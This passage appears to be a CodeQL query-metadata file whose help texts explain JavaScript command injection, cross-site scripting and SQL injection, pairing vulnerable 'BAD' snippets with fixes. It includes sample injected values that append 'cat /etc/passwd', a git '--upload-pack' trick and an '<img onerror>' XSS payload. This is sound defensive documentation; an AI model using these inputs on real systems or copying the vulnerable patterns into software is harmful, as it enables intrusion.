      Forwarding command-line arguments to `child_process.exec` or some other library routine that executes a system command within a shell can change the meaning of the command unexpectedly due to unescaped special characters.

      When the forwarded command-line arguments come from a parent process that has not escaped the special characters in the arguments, then the parent process may indirectly be vulnerable to command-line injection since the special characters are evaluated unexpectedly.


      ## Recommendation
      If possible, use APIs that don't run shell commands and accept command arguments as an array of strings rather than a single concatenated string. This is both safer and more portable.

      If given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.

      If this approach is not viable, then add code to verify that each forwarded command-line argument is properly escaped before using it.


      ## Example
      The following wrapper script example executes another JavaScript file in a child process and forwards some command-line arguments. This is problematic because the special characters in the command-line arguments may change the meaning of the child process invocation unexpectedly. For instance, if one of the command-line arguments is `"dollar$separated$name"`, then the child process will substitute the two environment variables `$separated` and `$name` before invoking `node`.


      ```javascript
      var cp = require("child_process");

      const args = process.argv.slice(2);
      const script = path.join(__dirname, 'bin', 'main.js');
      cp.execSync(`node ${script} ${args.join(' ')}`); // BAD

      ```
      If another program uses `child_process.execFile` to invoke the above wrapper script with input from a remote user, then there may be a command-line injection vulnerability. This may be surprising, since a command-line invocation with `child_process.execFile` is generally considered safe. But in this case, the remote user input is simply forwarded to the problematic `process.exec` call in the wrapper script.

      To guard against this, use an API that does not perform environment variable substitution, such as `child_process.execFile`:


      ```javascript
      var cp = require("child_process");

      const args = process.argv.slice(2);
      const script = path.join(__dirname, 'bin', 'main.js');
      cp.execFileSync('node', [script].concat(args)); // GOOD

      ```
      If you want to allow the user to specify other options to `node`, you can use a library like `shell-quote` to parse the user input into an array of arguments without risking command injection:


      ```javascript
      var cp = require("child_process"),
          shellQuote = require("shell-quote");

      const args = process.argv.slice(2);
      let nodeOpts = '';
      if (args[0] === '--node-opts') {
          nodeOpts = args[1];
          args.splice(0, 2);
      }
      const script = path.join(__dirname, 'bin', 'main.js');
      cp.execFileSync('node', shellQuote.parse(nodeOpts).concat(script).concat(args)); // GOOD

      ```

      ## References
      * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
      * npm: [shell-quote](https://www.npmjs.com/package/shell-quote).
      * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
      * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-078/SecondOrderCommandInjection.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/SecondOrderCommandInjection.bqrs
    metadata:
      name: Second order command injection
      description: |-
        Using user-controlled data as arguments to some commands, such as git clone,
                      can allow arbitrary commands to be executed.
      kind: path-problem
      problem.severity: error
      security-severity: 7.0
      precision: high
      id: js/second-order-command-line-injection
      tags: |-
        correctness
               security
               external/cwe/cwe-078
               external/cwe/cwe-088
    queryHelp: |
      # Second order command injection
      Some shell commands, like `git ls-remote`, can execute arbitrary commands if a user provides a malicious URL that starts with `--upload-pack`. This can be used to execute arbitrary code on the server.


      ## Recommendation
      Sanitize user input before passing it to the shell command. For example, ensure that URLs are valid and do not contain malicious commands.


      ## Example
      The following example shows code that executes `git ls-remote` on a URL that can be controlled by a malicious user.


      ```javascript
      const express = require("express");
      const app = express();

      const cp = require("child_process");

      app.get("/ls-remote", (req, res) => {
        const remote = req.query.remote;
        cp.execFile("git", ["ls-remote", remote]); // NOT OK
      });

      ```
      The problem has been fixed in the snippet below, where the URL is validated before being passed to the shell command.


      ```javascript
      const express = require("express");
      const app = express();

      const cp = require("child_process");

      app.get("/ls-remote", (req, res) => {
        const remote = req.query.remote;
        if (!(remote.startsWith("git@") || remote.startsWith("https://"))) {
          throw new Error("Invalid remote: " + remote);
        }
        cp.execFile("git", ["ls-remote", remote]); // OK
      });

      ```

      ## References
      * Max Justicz: [Hacking 3,000,000 apps at once through CocoaPods](https://justi.cz/security/2021/04/20/cocoapods-rce.html).
      * Git: [Git - git-ls-remote Documentation](https://git-scm.com/docs/git-ls-remote/2.22.0#Documentation/git-ls-remote.txt---upload-packltexecgt).
      * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
      * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
      * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-078/ShellCommandInjectionFromEnvironment.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/ShellCommandInjectionFromEnvironment.bqrs
    metadata:
      name: Shell command built from environment values
      description: |-
        Building a shell command string with values from the enclosing
                      environment may cause subtle bugs or vulnerabilities.
      kind: path-problem
      problem.severity: warning
      security-severity: 6.3
      precision: high
      id: js/shell-command-injection-from-environment
      tags: |-
        correctness
               security
               external/cwe/cwe-078
               external/cwe/cwe-088
    queryHelp: |
      # Shell command built from environment values
      Dynamically constructing a shell command with values from the local environment, such as file paths, may inadvertently change the meaning of the shell command. Such changes can occur when an environment value contains characters that the shell interprets in a special way, for instance quotes and spaces. This can result in the shell command misbehaving, or even allowing a malicious user to execute arbitrary commands on the system.


      ## Recommendation
      If possible, use hard-coded string literals to specify the shell command to run, and provide the dynamic arguments to the shell command separately to avoid interpretation by the shell.

      Alternatively, if the shell command must be constructed dynamically, then add code to ensure that special characters in environment values do not alter the shell command unexpectedly.


      ## Example
      The following example shows a dynamically constructed shell command that recursively removes a temporary directory that is located next to the currently executing JavaScript file. Such utilities are often found in custom build scripts.


      ```javascript
      var cp = require("child_process"),
        path = require("path");
      function cleanupTemp() {
        let cmd = "rm -rf " + path.join(__dirname, "temp");
        cp.execSync(cmd); // BAD
      }

      ```
      The shell command will, however, fail to work as intended if the absolute path of the script's directory contains spaces. In that case, the shell command will interpret the absolute path as multiple paths, instead of a single path.

      For instance, if the absolute path of the temporary directory is `/home/username/important project/temp`, then the shell command will recursively delete `/home/username/important` and `project/temp`, where the latter path gets resolved relative to the working directory of the JavaScript process.

      Even worse, although less likely, a malicious user could provide the path `/home/username/; cat /etc/passwd #/important project/temp` in order to execute the command `cat /etc/passwd`.

      To avoid such potentially catastrophic behaviors, provide the directory as an argument that does not get interpreted by a shell:


      ```javascript
      var cp = require("child_process"),
        path = require("path");
      function cleanupTemp() {
        let cmd = "rm",
          args = ["-rf", path.join(__dirname, "temp")];
        cp.execFileSync(cmd, args); // GOOD
      }

      ```

      ## References
      * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
      * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
      * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-078/UnsafeShellCommandConstruction.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/UnsafeShellCommandConstruction.bqrs
    metadata:
      name: Unsafe shell command constructed from library input
      description: |-
        Using externally controlled strings in a command line may allow a malicious
                      user to change the meaning of the command.
      kind: path-problem
      problem.severity: error
      security-severity: 6.3
      precision: high
      id: js/shell-command-constructed-from-input
      tags: |-
        correctness
               security
               external/cwe/cwe-078
               external/cwe/cwe-088
    queryHelp: |
      # Unsafe shell command constructed from library input
      Dynamically constructing a shell command with inputs from exported functions may inadvertently change the meaning of the shell command. Clients using the exported function may use inputs containing characters that the shell interprets in a special way, for instance quotes and spaces. This can result in the shell command misbehaving, or even allowing a malicious user to execute arbitrary commands on the system.


      ## Recommendation
      If possible, provide the dynamic arguments to the shell as an array using a safe API such as `child_process.execFile` to avoid interpretation by the shell.

      If given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.

      Alternatively, if the command must be interpreted by a shell (for example because it includes I/O redirections), you can use `shell-quote` to escape any special characters in the input before embedding it in the command.


      ## Example
      The following example shows a dynamically constructed shell command that downloads a file from a remote URL.


      ```javascript
      var cp = require("child_process");

      module.exports = function download(path, callback) {
        cp.exec("wget " + path, callback);
      }

      ```
      The shell command will, however, fail to work as intended if the input contains spaces or other special characters interpreted in a special way by the shell.

      Even worse, a client might pass in user-controlled data, not knowing that the input is interpreted as a shell command. This could allow a malicious user to provide the input `http://example.org; cat /etc/passwd` in order to execute the command `cat /etc/passwd`.

      To avoid such potentially catastrophic behaviors, provide the inputs from exported functions as an argument that does not get interpreted by a shell:


      ```javascript
      var cp = require("child_process");

      module.exports = function download(path, callback) {
        cp.execFile("wget", [path], callback);
      }

      ```
      As another example, consider the following code which is similar to the preceding example, but pipes the output of `wget` into `wc -l` to count the number of lines in the downloaded file.


      ```javascript
      var cp = require("child_process");

      module.exports = function download(path, callback) {
        cp.exec("wget " + path + " | wc -l", callback);
      };

      ```
      In this case, using `child_process.execFile` is not an option because the shell is needed to interpret the pipe operator. Instead, you can use `shell-quote` to escape the input before embedding it in the command:


      ```javascript
      var cp = require("child_process");

      module.exports = function download(path, callback) {
        cp.exec("wget " + shellQuote.quote([path]) + " | wc -l", callback);
      };

      ```

      ## References
      * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
      * npm: [shell-quote](https://www.npmjs.com/package/shell-quote).
      * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
      * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-078/UselessUseOfCat.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/UselessUseOfCat.bqrs
    metadata:
      name: Unnecessary use of `cat` process
      description:
        "Using the  `cat` process to read a file is unnecessarily complex,\
        \ inefficient, unportable, and can lead to subtle bugs, or even security vulnerabilities."
      kind: problem
      problem.severity: error
      security-severity: 6.3
      precision: high
      id: js/unnecessary-use-of-cat
      tags: |-
        correctness
               security
               maintainability
               external/cwe/cwe-078
    queryHelp: |
      # Unnecessary use of `cat` process
      Using the unix command `cat` only to read a file is an unnecessarily complex way to achieve something that can be done in a simpler and safer manner using the Node.js `fs.readFile` API.

      The use of `cat` for simple file reads leads to code that is unportable, inefficient, complex, and can lead to subtle bugs or even security vulnerabilities.


      ## Recommendation
      Use `fs.readFile` or `fs.readFileSync` to read files from the file system.


      ## Example
      The following example shows code that reads a file using `cat`:


      ```javascript
      var child_process = require('child_process');

      module.exports = function (name) {
          return child_process.execSync("cat " + name).toString();
      };

      ```
      The code in the example will break if the input `name` contains special characters (including space). Additionally, it does not work on Windows and if the input is user-controlled, a command injection attack can happen.

      The `fs.readFile` API should be used to avoid these potential issues:


      ```javascript
      var fs = require('fs');

      module.exports = function (name) {
          return fs.readFileSync(name).toString();
      };

      ```

      ## References
      * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
      * Node.js: [File System API](https://nodejs.org/api/fs.html).
      * [The Useless Use of Cat Award](http://porkmail.org/era/unix/award.html#cat).
      * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-079/ExceptionXss.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/ExceptionXss.bqrs
    metadata:
      name: Exception text reinterpreted as HTML
      description: |-
        Reinterpreting text from an exception as HTML
                      can lead to a cross-site scripting vulnerability.
      kind: path-problem
      problem.severity: warning
      security-severity: 6.1
      precision: high
      id: js/xss-through-exception
      tags: |-
        security
               external/cwe/cwe-079
               external/cwe/cwe-116
    queryHelp:
      "# Exception text reinterpreted as HTML\nDirectly writing error messages\
      \ to a webpage without sanitization allows for a cross-site scripting vulnerability\
      \ if parts of the error message can be influenced by a user.\n\n\n## Recommendation\n\
      To guard against cross-site scripting, consider using contextual output encoding/escaping\
      \ before writing user input to the page, or one of the other solutions that are\
      \ mentioned in the references.\n\n\n## Example\nThe following example shows an\
      \ exception being written directly to the document, and this exception can potentially\
      \ be influenced by the page URL, leaving the website vulnerable to cross-site\
      \ scripting.\n\n\n```javascript\nfunction setLanguageOptions() {\n    var href\
      \ = document.location.href,\n        deflt = href.substring(href.indexOf(\"default=\"\
      )+8);\n    \n    try {\n        var parsed = unknownParseFunction(deflt); \n \
      \   } catch(e) {\n        document.write(\"Had an error: \" + e + \".\");\n  \
      \  }\n}\n\n```\n\n## Example\nThis second example shows an input being validated\
      \ using the JSON schema validator `ajv`, and in case of an error, the error message\
      \ is sent directly back in the response.\n\n\n```javascript\nimport express from\
      \ 'express';\nimport Ajv from 'ajv';\n\nlet app = express();\nlet ajv = new Ajv();\n\
      \najv.addSchema({type: 'object', additionalProperties: {type: 'number'}}, 'pollData');\n\
      \napp.post('/polldata', (req, res) => {\n    if (!ajv.validate('pollData', req.body))\
      \ {\n        res.send(ajv.errorsText());\n    }\n});\n\n```\nThis is unsafe, because\
      \ the error message can contain parts of the input. For example, the input `{'<img\
      \ src=x onerror=alert(1)>': 'foo'}` will generate the error `data/<img src=x onerror=alert(1)>\
      \ should be number`, causing reflected XSS.\n\n\n## References\n* OWASP: [DOM\
      \ based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\
      * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n\
      * OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).\n* OWASP\
      \ [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n\
      * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n\
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n\
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-079/ReflectedXss.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/ReflectedXss.bqrs
    metadata:
      name: Reflected cross-site scripting
      description: |-
        Writing user input directly to an HTTP response allows for
                      a cross-site scripting vulnerability.
      kind: path-problem
      problem.severity: error
      security-severity: 7.8
      precision: high
      id: js/reflected-xss
      tags: |-
        security
               external/cwe/cwe-079
               external/cwe/cwe-116
    queryHelp: |
      # Reflected cross-site scripting
      Directly writing user input (for example, an HTTP request parameter) to an HTTP response without properly sanitizing the input first, allows for a cross-site scripting vulnerability.

      This kind of vulnerability is also called *reflected* cross-site scripting, to distinguish it from other types of cross-site scripting.


      ## Recommendation
      To guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the response, or one of the other solutions that are mentioned in the references.


      ## Example
      The following example code writes part of an HTTP request (which is controlled by the user) directly to the response. This leaves the website vulnerable to cross-site scripting.


      ```javascript
      var app = require('express')();

      app.get('/user/:id', function(req, res) {
        if (!isValidUserId(req.params.id))
          // BAD: a request parameter is incorporated without validation into the response
          res.send("Unknown user: " + req.params.id);
        else
          // TODO: do something exciting
          ;
      });

      ```
      Sanitizing the user-controlled data prevents the vulnerability:


      ```javascript
      var escape = require('escape-html');

      var app = require('express')();

      app.get('/user/:id', function(req, res) {
        if (!isValidUserId(req.params.id))
          // GOOD: request parameter is sanitized before incorporating it into the response
          res.send("Unknown user: " + escape(req.params.id));
        else
          // TODO: do something exciting
          ;
      });

      ```

      ## References
      * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
      * OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).
      * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-079/StoredXss.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/StoredXss.bqrs
    metadata:
      name: Stored cross-site scripting
      description: |-
        Using uncontrolled stored values in HTML allows for
                      a stored cross-site scripting vulnerability.
      kind: path-problem
      problem.severity: error
      security-severity: 7.8
      precision: high
      id: js/stored-xss
      tags: |-
        security
               external/cwe/cwe-079
               external/cwe/cwe-116
    queryHelp: |
      # Stored cross-site scripting
      Directly using uncontrolled stored value (for example, file names) to create HTML content without properly sanitizing the input first, allows for a cross-site scripting vulnerability.

      This kind of vulnerability is also called *stored* cross-site scripting, to distinguish it from other types of cross-site scripting.


      ## Recommendation
      To guard against cross-site scripting, consider using contextual output encoding/escaping before using uncontrolled stored values to create HTML content, or one of the other solutions that are mentioned in the references.


      ## Example
      The following example code writes file names directly to a HTTP response. This leaves the website vulnerable to cross-site scripting, if an attacker can choose the file names on the disk.


      ```javascript
      var express = require('express'),
          fs = require('fs');

      express().get('/list-directory', function(req, res) {
          fs.readdir('/public', function (error, fileNames) {
              var list = '<ul>';
              fileNames.forEach(fileName => {
                  // BAD: `fileName` can contain HTML elements
                  list += '<li>' + fileName + '</li>';
              });
              list += '</ul>'
              res.send(list);
          });
      });

      ```
      Sanitizing the file names prevents the vulnerability:


      ```javascript
      var express = require('express'),
          fs = require('fs'),
          escape = require('escape-html');

      express().get('/list-directory', function(req, res) {
          fs.readdir('/public', function (error, fileNames) {
              var list = '<ul>';
              fileNames.forEach(fileName => {
                  // GOOD: escaped `fileName` can not contain HTML elements
                  list += '<li>' + escape(fileName) + '</li>';
              });
              list += '</ul>'
              res.send(list);
          });
      });

      ```

      ## References
      * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
      * OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).
      * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-079/UnsafeHtmlConstruction.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/UnsafeHtmlConstruction.bqrs
    metadata:
      name: Unsafe HTML constructed from library input
      description: |-
        Using externally controlled strings to construct HTML might allow a malicious
                      user to perform a cross-site scripting attack.
      kind: path-problem
      problem.severity: error
      security-severity: 6.1
      precision: high
      id: js/html-constructed-from-input
      tags: |-
        security
               external/cwe/cwe-079
               external/cwe/cwe-116
    queryHelp: |
      # Unsafe HTML constructed from library input
      When a library function dynamically constructs HTML in a potentially unsafe way, then it's important to document to clients of the library that the function should only be used with trusted inputs. If the function is not documented as being potentially unsafe, then a client may inadvertently use inputs containing unsafe HTML fragments, and thereby leave the client vulnerable to cross-site scripting attacks.


      ## Recommendation
      Document all library functions that can lead to cross-site scripting attacks, and guard against unsafe inputs where dynamic HTML construction is not intended.


      ## Example
      The following example has a library function that renders a boldface name by writing to the `innerHTML` property of an element.


      ```javascript
      module.exports = function showBoldName(name) {
        document.getElementById('name').innerHTML = "<b>" + name + "</b>";
      }

      ```
      This library function, however, does not escape unsafe HTML, and a client that calls the function with user-supplied input may be vulnerable to cross-site scripting attacks.

      The library could either document that this function should not be used with unsafe inputs, or use safe APIs such as `innerText`.


      ```javascript
      module.exports = function showBoldName(name) {
        const bold = document.createElement('b');
        bold.innerText = name;
        document.getElementById('name').appendChild(bold);
      }

      ```
      Alternatively, an HTML sanitizer can be used to remove unsafe content.


      ```javascript

      const striptags = require('striptags');
      module.exports = function showBoldName(name) {
        document.getElementById('name').innerHTML = "<b>" + striptags(name) + "</b>";
      }

      ```

      ## References
      * OWASP: [DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).
      * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet).
      * OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).
      * OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).
      * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-079/UnsafeJQueryPlugin.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/UnsafeJQueryPlugin.bqrs
    metadata:
      name: Unsafe jQuery plugin
      description:
        A jQuery plugin that unintentionally constructs HTML from some of
        its options may be unsafe to use for clients.
      kind: path-problem
      problem.severity: warning
      security-severity: 6.1
      precision: high
      id: js/unsafe-jquery-plugin
      tags: |-
        security
               external/cwe/cwe-079
               external/cwe/cwe-116
               frameworks/jquery
    queryHelp:
      "# Unsafe jQuery plugin\nLibrary plugins, such as those for the jQuery\
      \ library, are often configurable through options provided by the clients of the\
      \ plugin. Clients, however, do not know the implementation details of the plugin,\
      \ so it is important to document the capabilities of each option. The documentation\
      \ for the plugin options that the client is responsible for sanitizing is of particular\
      \ importance. Otherwise, the plugin may write user input (for example, a URL query\
      \ parameter) to a web page without properly sanitizing it first, which allows\
      \ for a cross-site scripting vulnerability in the client application through dynamic\
      \ HTML construction.\n\n\n## Recommendation\nDocument all options that can lead\
      \ to cross-site scripting attacks, and guard against unsafe inputs where dynamic\
      \ HTML construction is not intended.\n\n\n## Example\nThe following example shows\
      \ a jQuery plugin that selects a DOM element, and copies its text content to another\
      \ DOM element. The selection is performed by using the plugin option `sourceSelector`\
      \ as a CSS selector.\n\n\n```javascript\njQuery.fn.copyText = function(options)\
      \ {\n\t// BAD may evaluate `options.sourceSelector` as HTML\n\tvar source = jQuery(options.sourceSelector),\n\
      \t    text = source.text();\n\tjQuery(this).text(text);\n}\n\n```\nThis is, however,\
      \ not a safe plugin, since the call to `jQuery` interprets `sourceSelector` as\
      \ HTML if it is a string that starts with `<`.\n\nInstead of documenting that\
      \ the client is responsible for sanitizing `sourceSelector`, the plugin can use\
      \ `jQuery.find` to always interpret `sourceSelector` as a CSS selector:\n\n\n\
      ```javascript\njQuery.fn.copyText = function(options) {\n\t// GOOD may not evaluate\
      \ `options.sourceSelector` as HTML\n\tvar source = jQuery.find(options.sourceSelector),\n\
      \t    text = source.text();\n\tjQuery(this).text(text);\n}\n\n```\n\n## References\n\
      * OWASP: [DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).\n\
      * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n\
      * OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).\n* OWASP\
      \ [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n\
      * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n\
      * jQuery: [Plugin creation](https://learn.jquery.com/plugins/basic-plugin-creation/).\n\
      * Bootstrap: [XSS vulnerable bootstrap plugins](https://github.com/twbs/bootstrap/pull/27047).\n\
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n\
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-079/Xss.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/Xss.bqrs
    metadata:
      name: Client-side cross-site scripting
      description: |-
        Writing user input directly to the DOM allows for
                      a cross-site scripting vulnerability.
      kind: path-problem
      problem.severity: error
      security-severity: 7.8
      precision: high
      id: js/xss
      tags: |-
        security
               external/cwe/cwe-079
               external/cwe/cwe-116
    queryHelp: |
      # Client-side cross-site scripting
      Directly writing user input (for example, a URL query parameter) to a webpage without properly sanitizing the input first, allows for a cross-site scripting vulnerability.

      This kind of vulnerability is also called *DOM-based* cross-site scripting, to distinguish it from other types of cross-site scripting.


      ## Recommendation
      To guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the page, or one of the other solutions that are mentioned in the references.


      ## Example
      The following example shows part of the page URL being written directly to the document, leaving the website vulnerable to cross-site scripting.


      ```javascript
      function setLanguageOptions() {
          var href = document.location.href,
              deflt = href.substring(href.indexOf("default=")+8);
          document.write("<OPTION value=1>"+deflt+"</OPTION>");
          document.write("<OPTION value=2>English</OPTION>");
      }

      ```

      ## References
      * OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).
      * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
      * OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).
      * OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).
      * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-079/XssThroughDom.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/XssThroughDom.bqrs
    metadata:
      name: DOM text reinterpreted as HTML
      description: |-
        Reinterpreting text from the DOM as HTML
                      can lead to a cross-site scripting vulnerability.
      kind: path-problem
      problem.severity: warning
      security-severity: 6.1
      precision: high
      id: js/xss-through-dom
      tags: |-
        security
               external/cwe/cwe-079
               external/cwe/cwe-116
    queryHelp:
      "# DOM text reinterpreted as HTML\nExtracting text from a DOM node and\
      \ interpreting it as HTML can lead to a cross-site scripting vulnerability.\n\n\
      A webpage with this vulnerability reads text from the DOM, and afterwards adds\
      \ the text as HTML to the DOM. Using text from the DOM as HTML effectively unescapes\
      \ the text, and thereby invalidates any escaping done on the text. If an attacker\
      \ is able to control the safe sanitized text, then this vulnerability can be exploited\
      \ to perform a cross-site scripting attack.\n\n\n## Recommendation\nTo guard against\
      \ cross-site scripting, consider using contextual output encoding/escaping before\
      \ writing text to the page, or one of the other solutions that are mentioned in\
      \ the References section below.\n\n\n## Example\nThe following example shows a\
      \ webpage using a `data-target` attribute to select and manipulate a DOM element\
      \ using the JQuery library. In the example, the `data-target` attribute is read\
      \ into the `target` variable, and the `$` function is then supposed to use the\
      \ `target` variable as a CSS selector to determine which element should be manipulated.\n\
      \n\n```javascript\n$(\"button\").click(function () {\n    var target = $(this).attr(\"\
      data-target\");\n    $(target).hide();\n});\n\n```\nHowever, if an attacker can\
      \ control the `data-target` attribute, then the value of `target` can be used\
      \ to cause the `$` function to execute arbitrary JavaScript.\n\nThe above vulnerability\
      \ can be fixed by using `$.find` instead of `$`. The `$.find` function will only\
      \ interpret `target` as a CSS selector and never as HTML, thereby preventing an\
      \ XSS attack.\n\n\n```javascript\n$(\"button\").click(function () {\n    var target\
      \ = $(this).attr(\"data-target\");\n\t$.find(target).hide();\n});\n\n```\n\n##\
      \ References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\
      * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n\
      * OWASP [DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS).\n\
      * OWASP [Types of Cross-Site Scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting).\n\
      * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n\
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n\
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-089/SqlInjection.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-089/SqlInjection.bqrs
    metadata:
      name: Database query built from user-controlled sources
      description: |-
        Building a database query from user-controlled sources is vulnerable to insertion of
                      malicious code by the user.
      kind: path-problem
      problem.severity: error
      security-severity: 8.8
      precision: high
      id: js/sql-injection
      tags: |-
        security
               external/cwe/cwe-089
               external/cwe/cwe-090
               external/cwe/cwe-943
    queryHelp: |
      # Database query built from user-controlled sources
      If a database query (such as a SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run malicious database queries.


      ## Recommendation
      Most database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements.

      For NoSQL queries, make use of an operator like MongoDB's `$eq` to ensure that untrusted data is interpreted as a literal value and not as a query object. Alternatively, check that the untrusted data is a literal value and not a query object before using it in a query.

      For SQL queries, use query parameters or prepared statements to embed untrusted data into the query string, or use a library like `sqlstring` to escape untrusted data.


      ## Example
